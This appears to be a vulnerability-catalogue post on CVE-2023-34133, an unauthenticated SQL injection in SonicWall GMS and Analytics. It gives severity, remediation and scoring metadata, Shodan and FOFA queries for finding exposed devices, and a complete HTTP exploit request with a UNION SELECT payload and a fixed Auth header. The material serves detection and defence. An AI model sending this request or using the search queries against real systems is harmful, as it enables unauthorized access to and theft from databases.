---
layout: post
cve_id: CVE-2023-34133
title: SonicWall GMS and Analytics - SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-34133.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-34133.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: high
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access,
  data leakage, and potential compromise of the target system.

  '
remediation: 'Apply the latest security patches or updates provided by SonicWall to
  mitigate this vulnerability.

  '
reference:
- https://raw.githubusercontent.com/rapid7/metasploit-framework/4b130f5be7590d04878f3bda37555e59e733324d/modules/exploits/multi/http/sonicwall_shell_injection_cve_2023_34124.rb
- https://www.sonicwall.com/support/product-notification/urgent-security-notice-sonicwall-gms-analytics-impacted-by-suite-of-vulnerabilities/230710150218060/
- https://github.com/getdrive/PoC/blob/main/2023/Sonicwall_Shell_Injection/sonicwall_shell_injection_cve_2023_34124.rb
- https://nvd.nist.gov/vuln/detail/CVE-2023-34133
- http://packetstormsecurity.com/files/174571/Sonicwall-GMS-9.9.9320-Remote-Code-Execution.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2023-34133
  cwe-id: CWE-89
  epss-score: 0.53826
  epss-percentile: 0.97901
  cpe: cpe:2.3:a:sonicwall:analytics:*:*:*:*:*:*:*:*
metadata:
  max-request: 4
  vendor: sonicwall
  product: analytics
  shodan-query: http.favicon.hash:"-1381126564"
  fofa-query: icon_hash="-1381126564"
tags:
- cve2023
- cve
- sonicwall
- sqli
- injection
- vkev
- vuln
---

## üîç Vulnerability Description
Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in SonicWall GMS and Analytics allows an unauthenticated attacker to extract sensitive information from the application database. This issue affects GMS: 9.3.2-SP1 and earlier versions; Analytics: 2.5.0.4-R7 and earlier versions.


## üåê HTTP Request
```nohighlight
GET /ws/msw/tenant/'%20union%20select%20(select%20ID%20from%20SGMSDB.DOMAINS)%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20(select%20MD5(6052))%2C''%2C%20''%2C%20' HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Auth: {"user": "system", "hash": "+uXW6kQMfprULOfy4COG13JZAgg="}
Accept-Encoding: gzip
```

